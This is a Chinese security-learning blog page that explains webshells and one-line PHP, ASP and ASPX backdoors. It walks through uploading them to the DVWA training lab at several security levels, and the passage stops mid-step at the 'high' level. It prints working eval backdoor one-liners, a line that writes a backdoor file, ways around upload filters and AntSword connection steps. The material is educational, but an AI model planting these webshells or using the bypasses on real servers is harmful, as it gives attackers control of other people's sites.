@@ -1,0 +1,540 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.5.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="Webshell（大马）webshell就是以 asp、aspx、php、jsp 或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp、aspx、php或jsp后门文件与网站web服务器目录下正常的网页文件混在一起，然后就可以使用浏览器来访问该后门文件了，从而得到一个命令执行环境，以达到控制网站服务器的目的。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web安全学习——Webshell和一句话木马">
+<meta property="og:url" content="http:&#x2F;&#x2F;no-timing&#x2F;no-timing.github.io&#x2F;2020&#x2F;04&#x2F;07&#x2F;Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Webshell%E5%92%8C%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC&#x2F;index.html">
+<meta property="og:site_name" content="no-timing">
+<meta property="og:description" content="Webshell（大马）webshell就是以 asp、aspx、php、jsp 或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp、aspx、php或jsp后门文件与网站web服务器目录下正常的网页文件混在一起，然后就可以使用浏览器来访问该后门文件了，从而得到一个命令执行环境，以达到控制网站服务器的目的。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https:&#x2F;&#x2F;user-images.githubusercontent.com&#x2F;39131787&#x2F;78746070-7b5e7800-7998-11ea-9bd7-c894a8aaa470.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;user-images.githubusercontent.com&#x2F;39131787&#x2F;78766070-6515e380-79bb-11ea-9d84-3fbf83cf9d83.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;user-images.githubusercontent.com&#x2F;39131787&#x2F;78766072-65ae7a00-79bb-11ea-862e-3cd2ed87dfc8.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;user-images.githubusercontent.com&#x2F;39131787&#x2F;78847275-e4012f80-7a40-11ea-9204-d56c9ea9b235.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;user-images.githubusercontent.com&#x2F;39131787&#x2F;78847273-e2d00280-7a40-11ea-9242-76c368821e4c.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;user-images.githubusercontent.com&#x2F;39131787&#x2F;78847631-f2038000-7a41-11ea-93ef-08ac651e6a1a.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;user-images.githubusercontent.com&#x2F;39131787&#x2F;78847630-f0d25300-7a41-11ea-84d4-c0c8083fb8f6.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;user-images.githubusercontent.com&#x2F;39131787&#x2F;78847271-e19ed580-7a40-11ea-8585-259829298063.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;user-images.githubusercontent.com&#x2F;39131787&#x2F;78847269-e06da880-7a40-11ea-918f-510f50a7eaf4.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;user-images.githubusercontent.com&#x2F;39131787&#x2F;78847267-dfd51200-7a40-11ea-84b3-1f0fb14b9ae5.png">
+<meta property="og:updated_time" content="2020-04-13T07:29:32.019Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;user-images.githubusercontent.com&#x2F;39131787&#x2F;78746070-7b5e7800-7998-11ea-9bd7-c894a8aaa470.png">
+
+<link rel="canonical" href="http://no-timing/no-timing.github.io/2020/04/07/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Webshell%E5%92%8C%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>Web安全学习——Webshell和一句话木马 | no-timing</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">no-timing</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/no-timing" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://no-timing/no-timing.github.io/2020/04/07/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Webshell%E5%92%8C%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/ame.jpg">
+      <meta itemprop="name" content="yzz">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="no-timing">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Web安全学习——Webshell和一句话木马
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-04-07 21:21:46" itemprop="dateCreated datePublished" datetime="2020-04-07T21:21:46+08:00">2020-04-07</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-04-13 15:29:32" itemprop="dateModified" datetime="2020-04-13T15:29:32+08:00">2020-04-13</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全学习</span>
+                  </a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5.6k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>5 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="Webshell（大马）"><a href="#Webshell（大马）" class="headerlink" title="Webshell（大马）"></a>Webshell（大马）</h3><p><strong>webshell</strong>就是以 asp、aspx、php、jsp 或者cgi等网页文件形式存在的一种<strong>命令执行环境</strong>，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp、aspx、php或jsp后门文件与网站web服务器目录下正常的网页文件混在一起，然后就可以使用浏览器来访问该后门文件了，从而得到一个命令执行环境，以达到控制网站服务器的目的。</p><a id="more"></a>
+<p>顾名思义，“web”的含义是显然需要服务器开放web服务，“shell”的含义是取得对服务器某种程度上的操作权限。webshell常常被称为入侵者通过网站端口对网站服务器的某种程度上操作的<strong>权限</strong>。由于webshell其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。</p>
+<p>一方面，webshell被站长常常用于网站管理、服务器管理等等，根据FSO权限的不同，作用有在线编辑网页脚本、上传下载文件、查看数据库、执行任意程序命令等。</p>
+<p>另一方面，被入侵者利用，从而达到控制网站服务器的目的。这些网页脚本常称为Web脚本木马，比较流行的asp或php木马，也有基于.NET的脚本木马与JSP脚本木马。</p>
+<p>但是这里所说的木马都是些体积“庞大”的木马，也就是黑客中常称呼的” 大马 “。</p>
+<h3 id="一句话木马（小马）"><a href="#一句话木马（小马）" class="headerlink" title="一句话木马（小马）"></a>一句话木马（小马）</h3><p>因为上面所介绍webshell概念中提到的大马在现阶段的安全领域中已经被盯的非常紧了，而且各种杀毒软件和防火墙软件都对这种“大马”有了甄别能力，所以如果被渗透的web服务器中安装了防御软件的话，留下这种大马作为自己的webshell就非常困难了，于是一种新型的webshell就横空出世了，那就是一句话木马。</p>
+<p>简单来说一句话木马就是通过向服务端提交一句简短的代码来达到向服务器插入木马并最终获得webshell的方法。</p>
+<p>对于不同的语言有不同的构造方法，基本构造是首先出现的是脚本开始的标记，后边跟着的 eval 或者是 execute 是核心部分，就是获取并执行后边得到的内容，而后边得到的内容，是 request 或者是 $_POST  获取的值。如果我们通过客户端向服务器发送，那么就会让服务器执行我们发送的脚本，挂马就实现了。</p>
+<p>一些不同脚本语言的一句话木马</p>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php一句话木马：  &lt;?php @eval($_POST[value]); ?&gt;</span><br><span class="line">asp一句话木马：  &lt;%eval request (<span class="string">"value"</span>)%&gt; 或  &lt;% execute(request(<span class="string">"value"</span>)) %&gt;   </span><br><span class="line">aspx一句话木马： &lt;%@ <span class="type">Page</span> <span class="type">Language</span>=<span class="string">"Jscript"</span> %&gt; &lt;% eval(<span class="type">Request</span>.<span class="type">Item</span>[<span class="string">"value"</span>]) %&gt;</span><br><span class="line"> </span><br><span class="line">&lt;?php fputs( fopen('xie.php','w') , '&lt;? php eval($_POST[xie]) ?&gt;' ) ; ?&gt;</span><br><span class="line">将当前目录下创建xie.php文件，并且将一句话木马写入xd.php中</span><br></pre></td></tr></table></figure>
+
+<h4 id="入侵条件"><a href="#入侵条件" class="headerlink" title="入侵条件"></a>入侵条件</h4><p>只要攻击者满足三个条件，就能实现成功入侵：</p>
+<ul>
+<li>木马上传成功，未被杀</li>
+<li>知道木马的路径在哪</li>
+<li>上传的木马能正常运行</li>
+</ul>
+<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>拿php的一句话木马说明一下原理：</p>
+<p>在PHP脚本语言中，eval(code) 的功能是将 code 组合成 php 指令，然后将指令执行，其他语言中也是使用此原理，只是函数可能不同。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $a=<span class="string">"phpinfo()"</span>; <span class="keyword">eval</span>(<span class="string">"$a;"</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>@</code>符号的意思是不报错，即使执行错误，也不报错。如果没有<code>@</code>符号，因为一个变量没有定义，就被拿去使用了，服务器就善意的提醒：Notice，你的xxx变量没有定义。</p>
+<p>php里面几个超全局变量：<code>$_GET</code>、<code>$_POST</code>就是其中之一。<code>$_POST[&#39;a&#39;]</code>; 的意思就是a这个变量，用post的方法接收。 </p>
+<blockquote>
+<p>注释：传输数据的两种方法，get、post，post是在消息体存放数据，get是在消息头的url路径里存放数据（例如xxx.php?a=2） </p>
+</blockquote>
+<p><strong>eval()把字符串作为PHP代码执行</strong></p>
+<p>当利用web中的漏洞将&lt;?php $a=”phpinfo()”; eval(“$a;”);?&gt;一句话插入到了可以被黑客访问且能被web服务器执行的文件中时，那么我们就可以向此文件提交post数据，post方式提交数据的参数就是这个一句话中的 value，它就称为一句话木马的密码。这样提交的数据如果是正确的php语言的语句，那么就可以被一句话木马执行，从而达到黑客的恶意目的。 </p>
+<p>当然前提是：php配置文件php.ini里，关掉安全模式safe_mode = off，然后再看看 禁用函数列表 disable_functions = proc_open, popen, exec, system, shell_exec ，把exec去掉，确保没有exec（有些cms为了方便处理某些功能，会去掉的）。</p>
+<p><img src="https://user-images.githubusercontent.com/39131787/78746070-7b5e7800-7998-11ea-9bd7-c894a8aaa470.png" alt="1"></p>
+<p><strong>优点</strong>：短小精悍，功能强大。</p>
+<p><strong>缺点</strong>：容易被安全软件检测出来。为了增强隐蔽性，也出现了各种一句话木马的变形。</p>
+<h4 id="变形"><a href="#变形" class="headerlink" title="变形"></a>变形</h4><p>黑客的目的，就是想尽办法给目标网站插入一句话木马，可以是一个单独的 .asp 或者是 .php，.aspx 文件，或者是隐藏在某些网页下。</p>
+<p>在上边的例子中，php 文件很明显的 eval 可以成为一个静态特征码，webshell扫描工具可以以此为关键词，扫描到这种木马加以屏蔽。</p>
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>以DVWA中的文件上传漏洞，使用一句话木马</p>
+<ul>
+<li><strong>low</strong></li>
+</ul>
+<p>首先在本地保存一句话木马文件Hack.php： </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'pass'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>查看后台源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>;</span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">    <span class="keyword">if</span>( !move_uploaded_file( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ], $target_path ) ) &#123;</span><br><span class="line">        <span class="comment">// No</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Yes!</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>从源码中发现，low级别未对上传的文件进行任何验证。所以可以直接上传PHP或者ASP一句话木马，此例采用php。 </p>
+<p>将一句话木马文件Hack.php上传，网页显示回显的路径</p>
+<p><img src="https://user-images.githubusercontent.com/39131787/78766070-6515e380-79bb-11ea-9d84-3fbf83cf9d83.png" alt="2"></p>
+<p>在该目录下也成功查看到Hack.php文件</p>
+<p><img src="https://user-images.githubusercontent.com/39131787/78766072-65ae7a00-79bb-11ea-862e-3cd2ed87dfc8.png" alt="3"></p>
+<p>利用蚁剑连接，右键添加，然后填写相关的数据</p>
+<p><img src="https://user-images.githubusercontent.com/39131787/78847275-e4012f80-7a40-11ea-9204-d56c9ea9b235.png" alt="4"></p>
+<p>蚁剑页面操作说明：</p>
+<pre><code>1、是连接的URL，就是网站的主路径然后加上上传文件时回显的保存路径；
+2、是菜刀连接时的密码，就是上面图片一句话提交的数据（本例为&quot;pass&quot;)；
+3、是一句话的解析类型，可以是asp，php，aspx。不同的解析类型的一句话内容不一样，文件后缀名不一样。</code></pre><p>可以看到添加成功，双击进去就可以看到了整个网站的结构和文件</p>
+<p><img src="https://user-images.githubusercontent.com/39131787/78847273-e2d00280-7a40-11ea-9242-76c368821e4c.png" alt="5"></p>
+<ul>
+<li><strong>Medium</strong></li>
+</ul>
+<p><strong>源码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>;</span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    $uploaded_name = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ];</span><br><span class="line">    $uploaded_type = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'type'</span> ];</span><br><span class="line">    $uploaded_size = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( $uploaded_type == <span class="string">"image/jpeg"</span> || $uploaded_type == <span class="string">"image/png"</span> ) &amp;&amp;</span><br><span class="line">        ( $uploaded_size &lt; <span class="number">100000</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ], $target_path ) ) &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到，Medium级别的代码对上传文件的类型、大小做了限制，要求文件类型必须是jpeg或者png，大小不能超过100000B（约为97.6KB）。 </p>
+<p>直接尝试修改文件名为Hack.png</p>
+<p>发现可以上传成功，接下来用蚁剑尝试连接</p>
+<p>有个小tips，在蚁剑连接时直接将上传的后缀改成phpj就可以连接了，不然会显示连接内容为空</p>
+<p><img src="https://user-images.githubusercontent.com/39131787/78847631-f2038000-7a41-11ea-93ef-08ac651e6a1a.png" alt="10"></p>
+<p><img src="https://user-images.githubusercontent.com/39131787/78847630-f0d25300-7a41-11ea-84d4-c0c8083fb8f6.png" alt="9"></p>
+<ul>
+<li><strong>High</strong></li>
+</ul>
+<p>木马如何才能上传成功？通常防御者都会对类型、大小、进行过滤。另外，若规定是上传的图片，还会对图片进行采集。即使攻击者修改文件类型，也过不了图片采集那一关。所以，这就需要一张图片来做掩护。做成隐藏在图片下的木马。linux和windows都有相应的命令，能够让一个文件融合到另一个文件后面，达到隐藏的目的。</p>
+<p>源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>;</span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    $uploaded_name = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ];</span><br><span class="line">    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, <span class="string">'.'</span> ) + <span class="number">1</span>);</span><br><span class="line">    $uploaded_size = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ];</span><br><span class="line">    $uploaded_tmp  = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( strtolower( $uploaded_ext ) == <span class="string">"jpg"</span> || strtolower( $uploaded_ext ) == <span class="string">"jpeg"</span> || strtolower( $uploaded_ext ) == <span class="string">"png"</span> ) &amp;&amp;</span><br><span class="line">        ( $uploaded_size &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line">        getimagesize( $uploaded_tmp ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p> 可以看到，High级别的代码读取文件名中最后一个”.”后的字符串，期望通过文件名来限制文件类型，因此要求上传文件名形式必须是<code>“*.jpg”</code>、<code>“*.jpeg”</code> 、<code>“*.png”</code>之一。同时，<code>getimagesize（）</code>函数更是限制了上传文件的<strong>文件头必须为图像类型</strong>。 </p>
+<p>直接改后缀名为<code>.jpg</code>会上传失败</p>
+<p> 将上传文件的文件头伪装成图片，首先利用<code>copy命令</code>将一句话木马文件<code>Hack.php</code>与正常的图片文件<code>1..png</code>合并： </p>
